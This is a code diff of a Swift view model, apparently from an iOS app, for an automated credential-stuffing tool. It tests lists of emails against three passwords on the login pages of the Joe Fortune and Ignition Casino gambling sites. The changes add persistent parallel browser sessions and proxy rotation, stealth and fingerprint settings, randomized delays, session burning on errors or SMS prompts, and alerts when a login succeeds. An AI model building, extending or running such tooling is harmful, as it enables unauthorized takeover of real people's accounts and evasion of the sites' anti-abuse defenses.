@@ -18,6 +18,7 @@ class DualFindViewModel {
     var currentEmailIndex: Int = 0
     var currentPasswordIndex: Int = 0
     var totalEmails: Int = 0
+    var completedTests: Int = 0
 
     var sessions: [DualFindSessionInfo] = []
     var logs: [PPSRLogEntry] = []
@@ -39,8 +40,13 @@ class DualFindViewModel {
     private var runTask: Task<Void, Never>?
     private let persistKey = "dual_find_resume_v1"
 
-    private var joeEngines: [LoginAutomationEngine] = []
-    private var ignitionEngines: [LoginAutomationEngine] = []
+    private var joePersistentSessions: [LoginSiteWebSession] = []
+    private var ignPersistentSessions: [LoginSiteWebSession] = []
+    private var joeCalibrations: [LoginCalibrationService.URLCalibration?] = []
+    private var ignCalibrations: [LoginCalibrationService.URLCalibration?] = []
+
+    private var joeNextEmailIdx: Int = 0
+    private var ignNextEmailIdx: Int = 0
 
     let urlRotation = LoginURLRotationService.shared
     let proxyService = ProxyRotationService.shared
@@ -49,17 +55,19 @@ class DualFindViewModel {
     private let backgroundService = BackgroundTaskService.shared
     private let networkFactory = NetworkSessionFactory.shared
     private let blacklistService = BlacklistService.shared
+    private let calibrationService = LoginCalibrationService.shared
 
     var progressText: String {
         guard totalEmails > 0 else { return "Ready" }
-        return "Email \(currentEmailIndex + 1)/\(totalEmails) — Password \(currentPasswordIndex + 1)/3"
+        let totalCombos = totalEmails * 3 * 2
+        return "\(completedTests)/\(totalCombos) tested — Password \(currentPasswordIndex + 1)/3"
     }
 
     var progressFraction: Double {
         guard totalEmails > 0 else { return 0 }
-        let totalCombos = totalEmails * 3
-        let completed = (currentPasswordIndex * totalEmails) + currentEmailIndex
-        return Double(completed) / Double(totalCombos)
+        let totalCombos = totalEmails * 3 * 2
+        guard totalCombos > 0 else { return 0 }
+        return Double(completedTests) / Double(totalCombos)
     }
 
     var parsedEmailCount: Int {
@@ -95,6 +103,7 @@ class DualFindViewModel {
         totalEmails = parsed.count
         currentEmailIndex = 0
         currentPasswordIndex = 0
+        completedTests = 0
         disabledEmails.removeAll()
         hits.removeAll()
         logs.removeAll()
@@ -102,12 +111,11 @@ class DualFindViewModel {
         isPaused = false
         isStopping = false
 
-        buildSessions()
-        buildEngines()
+        buildSessionInfoDisplay()
 
         logSettingsSummary()
         log("Starting Dual Find: \(totalEmails) emails × 3 passwords × 2 sites = \(totalEmails * 3 * 2) combinations")
-        log("Session mode: \(sessionCount.label)")
+        log("Session mode: \(sessionCount.label) — persistent sessions, field-clear pattern")
 
         isRunning = true
         DeviceProxyService.shared.notifyBatchStart()
@@ -130,6 +138,7 @@ class DualFindViewModel {
         disabledEmails = Set(rp.disabledEmails)
         hits = rp.foundLogins
         sessionCount = DualFindSessionCount(rawValue: rp.sessionCount) ?? .six
+        completedTests = 0
         logs.removeAll()
         sessions.removeAll()
         isPaused = false
@@ -139,8 +148,7 @@ class DualFindViewModel {
             passwords = rp.passwords
         }
 
-        buildSessions()
-        buildEngines()
+        buildSessionInfoDisplay()
 
         logSettingsSummary()
         log("Resuming Dual Find from Email \(currentEmailIndex + 1)/\(totalEmails), Password \(currentPasswordIndex + 1)/3")
@@ -176,203 +184,529 @@ class DualFindViewModel {
         UserDefaults.standard.removeObject(forKey: persistKey)
     }
 
-    // MARK: - Core Run Loop
+    // MARK: - Core Run Loop (Persistent Sessions, Independent Platform Loops)
 
     private func executeRun(emails: [String], passwords: [String]) async {
+        await withTaskGroup(of: Void.self) { group in
+            group.addTask {
+                await self.platformLoop(site: .joefortune, emails: emails, passwords: passwords)
+            }
+            group.addTask {
+                await self.platformLoop(site: .ignition, emails: emails, passwords: passwords)
+            }
+            await group.waitForAll()
+        }
+
+        teardownAllPersistentSessions()
+        finalizeRun()
+    }
+
+    private func platformLoop(site: LoginTargetSite, emails: [String], passwords: [String]) async {
         let perSite = sessionCount.perSite
+        let siteLabel = site == .joefortune ? "JOE" : "IGN"
+        let platformName = site == .joefortune ? "Joe Fortune" : "Ignition Casino"
+
+        log("[\(siteLabel)] Starting platform loop: \(perSite) persistent sessions")
+
+        var webSessions: [LoginSiteWebSession] = []
+        var calibrations: [LoginCalibrationService.URLCalibration?] = []
+
+        for i in 0..<perSite {
+            guard !isStopping else { return }
+            let label = "\(siteLabel)-\(i + 1)"
+
+            let session = createPersistentWebSession(site: site, sessionIndex: i)
+            webSessions.append(session)
+            calibrations.append(nil)
+
+            let loaded = await navigateAndSetupSession(session: session, site: site, label: label)
+            if !loaded {
+                log("[\(label)] Failed to load login page — will retry on first use", level: .error)
+            }
+
+            let cal = await calibrateSession(session: session, site: site, label: label)
+            calibrations[i] = cal
+
+            updateSession(id: "\(platformName)_\(i)", email: "", status: "Ready", active: false)
+        }
+
+        if site == .joefortune {
+            joePersistentSessions = webSessions
+            joeCalibrations = calibrations
+        } else {
+            ignPersistentSessions = webSessions
+            ignCalibrations = calibrations
+        }
 
         for pwIdx in currentPasswordIndex..<3 {
             guard !isStopping else { break }
-            currentPasswordIndex = pwIdx
             let password = passwords[pwIdx]
-            log("=== Password Round \(pwIdx + 1)/3 ===", level: .info)
+            log("[\(siteLabel)] === Password Round \(pwIdx + 1)/3 ===")
 
-            let startIdx = (pwIdx == resumePoint?.passwordIndex) ? currentEmailIndex : 0
-
-            for emailIdx in startIdx..<emails.count {
+            for i in 0..<webSessions.count {
                 guard !isStopping else { break }
+                let label = "\(siteLabel)-\(i + 1)"
+                let session = webSessions[i]
 
+                if pwIdx > 0 {
+                    await session.clearPasswordFieldOnly()
+                    try? await Task.sleep(for: .milliseconds(200))
+                    log("[\(label)] Cleared password field for pw \(pwIdx + 1)")
+                }
+
+                let cal = calibrations[i]
+                let fillResult = await session.fillPasswordCalibrated(password, calibration: cal)
+                if !fillResult.success {
+                    let tdResult = await session.trueDetectionFillPassword(password)
+                    if !tdResult.success {
+                        log("[\(label)] Password fill failed — trying legacy", level: .warning)
+                        _ = await session.fillPassword(password)
+                    }
+                }
+                log("[\(label)] Password \(pwIdx + 1) entered")
+                updateSession(id: "\(platformName)_\(i)", email: "", status: "PW\(pwIdx + 1) Ready", active: true)
+            }
+
+            let emailStartIdx: Int
+            if pwIdx == resumePoint?.passwordIndex, let rpIdx = resumePoint?.emailIndex {
+                emailStartIdx = rpIdx
+            } else {
+                emailStartIdx = 0
+            }
+
+            if site == .joefortune {
+                joeNextEmailIdx = emailStartIdx
+            } else {
+                ignNextEmailIdx = emailStartIdx
+            }
+
+            await withTaskGroup(of: Void.self) { group in
+                for i in 0..<webSessions.count {
+                    let sessionIdx = i
+                    group.addTask {
+                        await self.sessionEmailLoop(
+                            sessionIndex: sessionIdx,
+                            site: site,
+                            emails: emails,
+                            password: password,
+                            passwordIndex: pwIdx
+                        )
+                    }
+                }
+                await group.waitForAll()
+            }
+
+            if site == .joefortune {
+                currentPasswordIndex = pwIdx
+            }
+
+            log("[\(siteLabel)] Password \(pwIdx + 1)/3 complete", level: .success)
+        }
+
+        log("[\(siteLabel)] Platform loop complete — all 3 passwords tested", level: .success)
+    }
+
+    // MARK: - Per-Session Email Processing Loop
+
+    private func sessionEmailLoop(sessionIndex: Int, site: LoginTargetSite, emails: [String], password: String, passwordIndex: Int) async {
+        let siteLabel = site == .joefortune ? "JOE" : "IGN"
+        let platformName = site == .joefortune ? "Joe Fortune" : "Ignition Casino"
+        let label = "\(siteLabel)-\(sessionIndex + 1)"
+        let sessionInfoId = "\(platformName)_\(sessionIndex)"
+
+        while true {
+            guard !isStopping else { break }
+
+            while isPaused && !isStopping {
+                try? await Task.sleep(for: .milliseconds(500))
+            }
+            guard !isStopping else { break }
+
+            guard let emailIdx = grabNextEmail(for: site) else { break }
+            let email = emails[emailIdx]
+
+            currentEmailIndex = max(currentEmailIndex, emailIdx)
+
+            if disabledEmails.contains(email.lowercased()) {
+                log("[\(label)] Skipping disabled: \(email)")
+                completedTests += 1
+                continue
+            }
+
+            updateSession(id: sessionInfoId, email: email, status: "Testing", active: true)
+
+            guard let session = getPersistentSession(site: site, index: sessionIndex) else {
+                log("[\(label)] No session available — skipping", level: .error)
+                completedTests += 1
+                continue
+            }
+
+            let fieldsCheck = await session.verifyLoginFieldsExist()
+            if fieldsCheck.found < 2 {
+                log("[\(label)] Form fields missing — reloading page", level: .warning)
+                let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
+                if reloaded {
+                    let cal = await calibrateSession(session: session, site: site, label: label)
+                    setCalibration(site: site, index: sessionIndex, calibration: cal)
+                    _ = await session.fillPasswordCalibrated(password, calibration: cal)
+                } else {
+                    log("[\(label)] Page reload failed — burning session", level: .error)
+                    await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
+                }
+            }
+
+            await session.clearEmailFieldOnly()
+            try? await Task.sleep(for: .milliseconds(100))
+
+            let cal = getCalibration(site: site, index: sessionIndex)
+            let emailFillResult = await session.fillUsernameCalibrated(email, calibration: cal)
+            if !emailFillResult.success {
+                let tdResult = await session.trueDetectionFillEmail(email)
+                if !tdResult.success {
+                    log("[\(label)] Email fill failed for \(email) — trying legacy", level: .warning)
+                    _ = await session.fillUsername(email)
+                }
+            }
+
+            try? await Task.sleep(for: .milliseconds(Int.random(in: 100...300)))
+
+            let calForBtn = getCalibration(site: site, index: sessionIndex)
+            let submitResult = await session.clickLoginButtonCalibrated(calibration: calForBtn)
+            if !submitResult.success {
+                let tdSubmit = await session.trueDetectionTripleClickSubmit()
+                if !tdSubmit.success {
+                    _ = await session.pressEnterOnPasswordField()
+                }
+            }
+
+            try? await Task.sleep(for: .seconds(6))
+
+            let outcome = await evaluateResponseWithTimeout(session: session, timeout: 10)
+
+            switch outcome {
+            case .success:
+                let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
+                hits.append(hit)
+                latestHit = hit
+                showLoginFound = true
+                log("🎯 LOGIN FOUND: \(email) on \(site.rawValue)", level: .success)
+                sendLoginFoundNotification(email: email, platform: site.rawValue)
+                updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)
+
+                saveResumePoint()
+                isPaused = true
                 while isPaused && !isStopping {
                     try? await Task.sleep(for: .milliseconds(500))
                 }
-                guard !isStopping else { break }
+                if isStopping { break }
+                showLoginFound = false
 
-                let email = emails[emailIdx]
-                currentEmailIndex = emailIdx
+                let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
+                if reloaded {
+                    let newCal = await calibrateSession(session: session, site: site, label: label)
+                    setCalibration(site: site, index: sessionIndex, calibration: newCal)
+                    _ = await session.fillPasswordCalibrated(password, calibration: newCal)
+                }
 
-                if disabledEmails.contains(email.lowercased()) {
-                    log("Skipping disabled: \(email)")
+            case .disabled:
+                disabledEmails.insert(email.lowercased())
+                log("[\(label)] \(email) — DISABLED (eliminated from all testing)", level: .error)
+                updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)
+
+                let checkFields = await session.verifyLoginFieldsExist()
+                if checkFields.found < 2 {
+                    let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
+                    if reloaded {
+                        let newCal = await calibrateSession(session: session, site: site, label: label)
+                        setCalibration(site: site, index: sessionIndex, calibration: newCal)
+                        _ = await session.fillPasswordCalibrated(password, calibration: newCal)
+                    }
+                }
+
+            case .transient:
+                log("[\(label)] \(email) — transient error, burning session & retrying", level: .warning)
+                updateSession(id: sessionInfoId, email: email, status: "Rebuilding", active: true)
+
+                await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
+
+                guard let freshSession = getPersistentSession(site: site, index: sessionIndex) else {
+                    log("[\(label)] Replacement session unavailable", level: .error)
+                    completedTests += 1
                     continue
                 }
 
-                await withTaskGroup(of: Void.self) { group in
-                    for i in 0..<perSite {
-                        let joeIdx = i
-                        let ignIdx = i
+                let retryOutcome = await retryEmailOnFreshSession(
+                    session: freshSession, email: email, password: password,
+                    site: site, sessionIndex: sessionIndex, label: label
+                )
 
-                        if joeIdx < joeEngines.count {
-                            group.addTask {
-                                await self.testEmailOnSite(
-                                    email: email,
-                                    password: password,
-                                    engineIndex: joeIdx,
-                                    site: .joefortune,
-                                    sessionLabel: "JOE-\(joeIdx + 1)"
-                                )
-                            }
-                        }
+                switch retryOutcome {
+                case .success:
+                    let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
+                    hits.append(hit)
+                    latestHit = hit
+                    showLoginFound = true
+                    log("🎯 LOGIN FOUND (retry): \(email) on \(site.rawValue)", level: .success)
+                    sendLoginFoundNotification(email: email, platform: site.rawValue)
+                    updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)
 
-                        if ignIdx < ignitionEngines.count {
-                            group.addTask {
-                                await self.testEmailOnSite(
-                                    email: email,
-                                    password: password,
-                                    engineIndex: ignIdx,
-                                    site: .ignition,
-                                    sessionLabel: "IGN-\(ignIdx + 1)"
-                                )
-                            }
-                        }
-                    }
-                    await group.waitForAll()
-                }
-
-                if showLoginFound {
                     saveResumePoint()
-                    log("LOGIN FOUND — run paused. Resume when ready.", level: .success)
                     isPaused = true
                     while isPaused && !isStopping {
                         try? await Task.sleep(for: .milliseconds(500))
                     }
                     if isStopping { break }
                     showLoginFound = false
+
+                case .disabled:
+                    disabledEmails.insert(email.lowercased())
+                    log("[\(label)] retry: \(email) — DISABLED (eliminated)", level: .error)
+                    updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)
+
+                default:
+                    log("[\(label)] retry: \(email) — \(retryOutcome) (moving on)", level: .warning)
+                    updateSession(id: sessionInfoId, email: email, status: "Done", active: false)
                 }
-            }
-        }
 
-        finalizeRun()
-    }
-
-    private func testEmailOnSite(email: String, password: String, engineIndex: Int, site: LoginTargetSite, sessionLabel: String) async {
-        let engines = site == .joefortune ? joeEngines : ignitionEngines
-        guard engineIndex < engines.count else { return }
-        let engine = engines[engineIndex]
-
-        let sessionInfoId = "\(site == .joefortune ? "Joe Fortune" : "Ignition Casino")_\(engineIndex)"
-        updateSession(id: sessionInfoId, email: email, status: "Testing", active: true)
-
-        let cred = LoginCredential(username: email, password: password)
-        let attempt = LoginAttempt(credential: cred, sessionIndex: engineIndex + 1)
-
-        let wasIgnition = urlRotation.isIgnitionMode
-        urlRotation.isIgnitionMode = (site == .ignition)
-        let testURL = urlRotation.nextURL() ?? site.url
-        urlRotation.isIgnitionMode = wasIgnition
-
-        engine.proxyTarget = (site == .joefortune) ? .joe : .ignition
-
-        let outcome = await engine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
-
-        switch outcome {
-        case .success:
-            let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
-            hits.append(hit)
-            latestHit = hit
-            showLoginFound = true
-            log("🎯 LOGIN FOUND: \(email) on \(site.rawValue)", level: .success)
-            sendLoginFoundNotification(email: email, platform: site.rawValue)
-            updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)
-
-        case .permDisabled:
-            disabledEmails.insert(email.lowercased())
-            log("\(sessionLabel) \(email) — DISABLED (eliminated from all testing)", level: .error)
-            updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)
-
-        case .tempDisabled:
-            let content = attempt.responseSnippet?.lowercased() ?? ""
-            if content.contains("disabled") {
-                disabledEmails.insert(email.lowercased())
-                log("\(sessionLabel) \(email) — disabled keyword found, eliminated", level: .error)
-                updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)
-            } else {
-                log("\(sessionLabel) \(email) — temp issue, will retry", level: .warning)
-                await retryOnTransientError(email: email, password: password, engineIndex: engineIndex, site: site, sessionLabel: sessionLabel)
-            }
-
-        case .timeout, .connectionFailure, .redBannerError:
-            log("\(sessionLabel) \(email) — transient error (\(outcome)), burning session & retrying", level: .warning)
-            await retryOnTransientError(email: email, password: password, engineIndex: engineIndex, site: site, sessionLabel: sessionLabel)
-
-        case .unsure:
-            let snippet = (attempt.responseSnippet ?? "").lowercased()
-            if snippet.contains("error") || snippet.contains("sms") {
-                log("\(sessionLabel) \(email) — ERROR/SMS detected, burning & retrying", level: .warning)
-                await retryOnTransientError(email: email, password: password, engineIndex: engineIndex, site: site, sessionLabel: sessionLabel)
-            } else {
-                log("\(sessionLabel) \(email) — no account (password \(currentPasswordIndex + 1))", level: .info)
+            case .noAccount:
+                log("[\(label)] \(email) — no account (pw \(passwordIndex + 1))")
                 updateSession(id: sessionInfoId, email: email, status: "No Acc", active: false)
             }
 
-        case .noAcc:
-            log("\(sessionLabel) \(email) — no account (password \(currentPasswordIndex + 1))", level: .info)
-            updateSession(id: sessionInfoId, email: email, status: "No Acc", active: false)
+            completedTests += 1
         }
     }
 
-    private func retryOnTransientError(email: String, password: String, engineIndex: Int, site: LoginTargetSite, sessionLabel: String) async {
-        let engines = site == .joefortune ? joeEngines : ignitionEngines
-        guard engineIndex < engines.count else { return }
+    // MARK: - Response Evaluation
 
-        let sessionInfoId = "\(site == .joefortune ? "Joe Fortune" : "Ignition Casino")_\(engineIndex)"
-        updateSession(id: sessionInfoId, email: email, status: "Rebuilding", active: true)
+    private func evaluateResponseWithTimeout(session: LoginSiteWebSession, timeout: TimeInterval) async -> DualFindTestOutcome {
+        let result: DualFindTestOutcome = await withTaskGroup(of: DualFindTestOutcome.self) { group in
+            group.addTask {
+                return await self.evaluateResponse(session: session)
+            }
+            group.addTask {
+                try? await Task.sleep(for: .seconds(timeout))
+                return .transient
+            }
+            let first = await group.next() ?? .transient
+            group.cancelAll()
+            return first
+        }
+        return result
+    }
 
-        let freshEngine = LoginAutomationEngine()
-        freshEngine.debugMode = debugMode
-        freshEngine.stealthEnabled = stealthEnabled
-        freshEngine.automationSettings = automationSettings
-        freshEngine.proxyTarget = (site == .joefortune) ? .joe : .ignition
-        wireEngineCallbacks(freshEngine, label: sessionLabel)
+    private func evaluateResponse(session: LoginSiteWebSession) async -> DualFindTestOutcome {
+        let pageContent = await session.getPageContent()
+        let contentLower = pageContent.lowercased()
+        let currentURL = await session.getCurrentURL()
+        let urlLower = currentURL.lowercased()
 
-        if site == .joefortune {
-            joeEngines[engineIndex] = freshEngine
-        } else {
-            ignitionEngines[engineIndex] = freshEngine
+        let successMarkers = ["balance", "wallet", "my account", "logout", "dashboard", "deposit"]
+        for marker in successMarkers {
+            if contentLower.contains(marker) && !urlLower.contains("/login") && !urlLower.contains("/signin") {
+                return .success
+            }
         }
 
-        let cred = LoginCredential(username: email, password: password)
-        let attempt = LoginAttempt(credential: cred, sessionIndex: engineIndex + 1)
+        if !urlLower.contains("/login") && !urlLower.contains("/signin") && !urlLower.contains("error") {
+            for marker in ["balance", "wallet", "my account", "logout"] {
+                if contentLower.contains(marker) {
+                    return .success
+                }
+            }
+            let tdValidation = await session.trueDetectionValidateSuccess()
+            if tdValidation.success {
+                return .success
+            }
+        }
 
-        let wasIgnition = urlRotation.isIgnitionMode
+        if contentLower.contains("disabled") || contentLower.contains("account is disabled") || contentLower.contains("temporarily disabled") {
+            return .disabled
+        }
+
+        if contentLower.contains("error") && !contentLower.contains("incorrect") && !contentLower.contains("invalid") && !contentLower.contains("wrong") {
+            return .transient
+        }
+        if contentLower.contains("sms") {
+            return .transient
+        }
+
+        if pageContent.trimmingCharacters(in: .whitespacesAndNewlines).count < 30 {
+            return .transient
+        }
+
+        return .noAccount
+    }
+
+    // MARK: - Retry on Fresh Session
+
+    private func retryEmailOnFreshSession(session: LoginSiteWebSession, email: String, password: String, site: LoginTargetSite, sessionIndex: Int, label: String) async -> DualFindTestOutcome {
+        await session.clearEmailFieldOnly()
+        try? await Task.sleep(for: .milliseconds(100))
+
+        let cal = getCalibration(site: site, index: sessionIndex)
+        let fillResult = await session.fillUsernameCalibrated(email, calibration: cal)
+        if !fillResult.success {
+            let tdResult = await session.trueDetectionFillEmail(email)
+            if !tdResult.success {
+                _ = await session.fillUsername(email)
+            }
+        }
+
+        try? await Task.sleep(for: .milliseconds(Int.random(in: 100...300)))
+
+        let submitResult = await session.clickLoginButtonCalibrated(calibration: cal)
+        if !submitResult.success {
+            let tdSubmit = await session.trueDetectionTripleClickSubmit()
+            if !tdSubmit.success {
+                _ = await session.pressEnterOnPasswordField()
+            }
+        }
+
+        try? await Task.sleep(for: .seconds(6))
+
+        return await evaluateResponseWithTimeout(session: session, timeout: 10)
+    }
+
+    // MARK: - Persistent Session Management
+
+    private func createPersistentWebSession(site: LoginTargetSite, sessionIndex: Int) -> LoginSiteWebSession {
+        let proxyTarget: ProxyRotationService.ProxyTarget = site == .joefortune ? .joe : .ignition
+        let netConfig = networkFactory.nextConfig(for: proxyTarget)
+
         urlRotation.isIgnitionMode = (site == .ignition)
-        let testURL = urlRotation.nextURL() ?? site.url
-        urlRotation.isIgnitionMode = wasIgnition
+        let targetURL = urlRotation.nextURL() ?? site.url
 
-        let outcome = await freshEngine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
+        let session = LoginSiteWebSession(targetURL: targetURL, networkConfig: netConfig)
+        session.stealthEnabled = stealthEnabled
+        session.fingerprintValidationEnabled = automationSettings.fingerprintValidationEnabled
+        session.setUp(wipeAll: true)
 
-        switch outcome {
-        case .success:
-            let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
-            hits.append(hit)
-            latestHit = hit
-            showLoginFound = true
-            log("🎯 LOGIN FOUND (retry): \(email) on \(site.rawValue)", level: .success)
-            sendLoginFoundNotification(email: email, platform: site.rawValue)
-            updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)
+        return session
+    }
 
-        case .permDisabled:
-            disabledEmails.insert(email.lowercased())
-            log("\(sessionLabel) retry: \(email) — DISABLED (eliminated)", level: .error)
-            updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)
+    private func navigateAndSetupSession(session: LoginSiteWebSession, site: LoginTargetSite, label: String) async -> Bool {
+        for attempt in 1...3 {
+            let loaded = await session.loadPage(timeout: automationSettings.pageLoadTimeout)
+            if loaded {
+                await session.dismissCookieNotices()
+                try? await Task.sleep(for: .milliseconds(300))
+                return true
+            }
+            log("[\(label)] Page load attempt \(attempt)/3 failed: \(session.lastNavigationError ?? "unknown")", level: .warning)
+            if attempt < 3 {
+                try? await Task.sleep(for: .seconds(Double(attempt) * 2))
+                if attempt == 2 {
+                    session.tearDown(wipeAll: true)
+                    session.setUp(wipeAll: true)
+                }
+            }
+        }
+        return false
+    }
 
-        default:
-            log("\(sessionLabel) retry: \(email) — \(outcome) (moving on)", level: .warning)
-            updateSession(id: sessionInfoId, email: email, status: "Done", active: false)
+    private func calibrateSession(session: LoginSiteWebSession, site: LoginTargetSite, label: String) async -> LoginCalibrationService.URLCalibration? {
+        let urlString = session.targetURL.absoluteString
+        if let existing = calibrationService.calibrationFor(url: urlString), existing.isCalibrated {
+            log("[\(label)] Using saved calibration")
+            return existing
+        }
+        if let cal = await session.autoCalibrate() {
+            calibrationService.saveCalibration(cal, forURL: urlString)
+            log("[\(label)] Auto-calibrated: email=\(cal.emailField?.cssSelector ?? "nil") pass=\(cal.passwordField?.cssSelector ?? "nil") btn=\(cal.loginButton?.cssSelector ?? "nil")")
+            return cal
+        }
+        log("[\(label)] Calibration failed — using generic selectors", level: .warning)
+        return nil
+    }
+
+    private func burnAndReplaceSession(site: LoginTargetSite, index: Int, password: String, label: String) async {
+        log("[\(label)] Burning session and creating replacement", level: .warning)
+
+        let oldSession = getPersistentSession(site: site, index: index)
+        oldSession?.tearDown(wipeAll: true)
+
+        let newSession = createPersistentWebSession(site: site, sessionIndex: index)
+        setPersistentSession(site: site, index: index, session: newSession)
+
+        let loaded = await navigateAndSetupSession(session: newSession, site: site, label: label)
+        guard loaded else {
+            log("[\(label)] Replacement session failed to load", level: .error)
+            return
+        }
+
+        let cal = await calibrateSession(session: newSession, site: site, label: label)
+        setCalibration(site: site, index: index, calibration: cal)
+
+        let fillResult = await newSession.fillPasswordCalibrated(password, calibration: cal)
+        if !fillResult.success {
+            _ = await newSession.trueDetectionFillPassword(password)
+        }
+        log("[\(label)] Replacement session ready")
+    }
+
+    private func getPersistentSession(site: LoginTargetSite, index: Int) -> LoginSiteWebSession? {
+        let sessions = site == .joefortune ? joePersistentSessions : ignPersistentSessions
+        guard index < sessions.count else { return nil }
+        return sessions[index]
+    }
+
+    private func setPersistentSession(site: LoginTargetSite, index: Int, session: LoginSiteWebSession) {
+        if site == .joefortune {
+            guard index < joePersistentSessions.count else { return }
+            joePersistentSessions[index] = session
+        } else {
+            guard index < ignPersistentSessions.count else { return }
+            ignPersistentSessions[index] = session
         }
     }
 
-    // MARK: - Session Management
+    private func getCalibration(site: LoginTargetSite, index: Int) -> LoginCalibrationService.URLCalibration? {
+        let cals = site == .joefortune ? joeCalibrations : ignCalibrations
+        guard index < cals.count else { return nil }
+        return cals[index]
+    }
 
-    private func buildSessions() {
+    private func setCalibration(site: LoginTargetSite, index: Int, calibration: LoginCalibrationService.URLCalibration?) {
+        if site == .joefortune {
+            guard index < joeCalibrations.count else { return }
+            joeCalibrations[index] = calibration
+        } else {
+            guard index < ignCalibrations.count else { return }
+            ignCalibrations[index] = calibration
+        }
+    }
+
+    private func grabNextEmail(for site: LoginTargetSite) -> Int? {
+        if site == .joefortune {
+            let idx = joeNextEmailIdx
+            guard idx < emails.count else { return nil }
+            joeNextEmailIdx += 1
+            return idx
+        } else {
+            let idx = ignNextEmailIdx
+            guard idx < emails.count else { return nil }
+            ignNextEmailIdx += 1
+            return idx
+        }
+    }
+
+    private func teardownAllPersistentSessions() {
+        for session in joePersistentSessions {
+            session.tearDown(wipeAll: true)
+        }
+        for session in ignPersistentSessions {
+            session.tearDown(wipeAll: true)
+        }
+        joePersistentSessions.removeAll()
+        ignPersistentSessions.removeAll()
+        joeCalibrations.removeAll()
+        ignCalibrations.removeAll()
+    }
+
+    // MARK: - Session Display Info
+
+    private func buildSessionInfoDisplay() {
         sessions.removeAll()
         let perSite = sessionCount.perSite
         for i in 0..<perSite {
@@ -380,52 +714,6 @@ class DualFindViewModel {
         }
         for i in 0..<perSite {
             sessions.append(DualFindSessionInfo(index: i, platform: "Ignition Casino"))
-        }
-    }
-
-    private func buildEngines() {
-        joeEngines.removeAll()
-        ignitionEngines.removeAll()
-        let perSite = sessionCount.perSite
-
-        for i in 0..<perSite {
-            let engine = LoginAutomationEngine()
-            configureEngine(engine, target: .joe)
-            wireEngineCallbacks(engine, label: "JOE-\(i + 1)")
-            joeEngines.append(engine)
-        }
-
-        for i in 0..<perSite {
-            let engine = LoginAutomationEngine()
-            configureEngine(engine, target: .ignition)
-            wireEngineCallbacks(engine, label: "IGN-\(i + 1)")
-            ignitionEngines.append(engine)
-        }
-    }
-
-    private func configureEngine(_ engine: LoginAutomationEngine, target: ProxyRotationService.ProxyTarget) {
-        engine.debugMode = debugMode
-        engine.stealthEnabled = stealthEnabled
-        engine.automationSettings = automationSettings
-        engine.proxyTarget = target
-    }
-
-    private func wireEngineCallbacks(_ engine: LoginAutomationEngine, label: String) {
-        engine.onLog = { [weak self] message, level in
-            self?.log("[\(label)] \(message)", level: level)
-        }
-        engine.onURLFailure = { [weak self] urlString in
-            self?.urlRotation.reportFailure(urlString: urlString)
-        }
-        engine.onURLSuccess = { [weak self] urlString in
-            self?.urlRotation.reportSuccess(urlString: urlString)
-        }
-        engine.onResponseTime = { [weak self] urlString, duration in
-            self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
-        }
-        engine.onBlankScreenshot = { [weak self] urlString in
-            self?.urlRotation.reportFailure(urlString: urlString)
-            self?.log("[\(label)] Blank screenshot — URL rotated", level: .warning)
         }
     }
 
@@ -446,11 +734,10 @@ class DualFindViewModel {
         isStopping = false
         backgroundService.endExtendedBackgroundExecution()
 
-        let totalTested = (currentPasswordIndex * totalEmails) + currentEmailIndex
-        let totalPossible = totalEmails * 3
+        let totalPossible = totalEmails * 3 * 2
 
         if stoppedEarly {
-            log("Run stopped: \(hits.count) hits, \(disabledEmails.count) disabled, tested \(totalTested)/\(totalPossible)", level: .warning)
+            log("Run stopped: \(hits.count) hits, \(disabledEmails.count) disabled, tested \(completedTests)/\(totalPossible)", level: .warning)
             saveResumePoint()
         } else {
             log("Run complete: \(hits.count) hits found, \(disabledEmails.count) disabled, \(totalPossible) combinations tested", level: .success)
@@ -524,11 +811,10 @@ class DualFindViewModel {
         let joeMode = proxyService.connectionMode(for: .joe)
         let ignMode = proxyService.connectionMode(for: .ignition)
         let deviceWide = DeviceProxyService.shared.isEnabled
-        log("Settings: timeout=\(Int(testTimeout))s stealth=\(stealthEnabled) debug=\(debugMode) concurrency=\(maxConcurrency)")
+        log("Settings: timeout=\(Int(testTimeout))s stealth=\(stealthEnabled) debug=\(debugMode)")
         log("Network: Joe=\(joeMode.label) Ignition=\(ignMode.label) DeviceWide=\(deviceWide)")
-        log("Automation: pageLoad=\(Int(automationSettings.pageLoadTimeout))s fpValidation=\(automationSettings.fingerprintValidationEnabled) humanSim=\(automationSettings.humanMouseMovement)")
-        log("Fallback: WG→OVPN=\(automationSettings.autoFallbackWGtoOVPN) OVPN→SOCKS5=\(automationSettings.autoFallbackOVPNtoSOCKS5)")
-        log("Delays: pageExtra=\(automationSettings.pageLoadExtraDelayMs)ms submitWait=\(automationSettings.submitButtonWaitDelayMs)ms betweenAttempts=\(automationSettings.betweenAttemptsDelayMs)ms")
+        log("Automation: pageLoad=\(Int(automationSettings.pageLoadTimeout))s fpValidation=\(automationSettings.fingerprintValidationEnabled)")
+        log("Pattern: persistent sessions, email-clear-only per test, password-clear only on pw advance (2× per platform)")
     }
 
     // MARK: - Notifications
